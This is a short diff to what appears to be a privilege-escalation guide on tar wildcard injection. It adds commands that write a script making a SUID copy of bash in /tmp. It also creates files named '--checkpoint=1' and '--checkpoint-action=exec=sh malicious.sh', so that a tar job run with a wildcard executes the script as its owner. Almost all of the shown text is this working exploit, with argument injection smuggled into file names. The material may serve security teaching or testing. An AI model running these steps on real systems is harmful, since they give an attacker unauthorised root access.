@@ -395,7 +395,9 @@ tar czf /tmp/backup.tar.gz *
 Then you can. 
 
 ```text
-touch /home/user/--checkpoint=1
-touch /home/user/--checkpoint-action=exec=sh\malicious.sh
+echo "cp /bin/bash /tmp/yz && chmod +s /tmp/yz" > malicious.sh
+chmod +x malicious.sh
+touch ./--checkpoint=1
+touch ./--checkpoint-action=exec=sh\malicious.sh
 ```
 
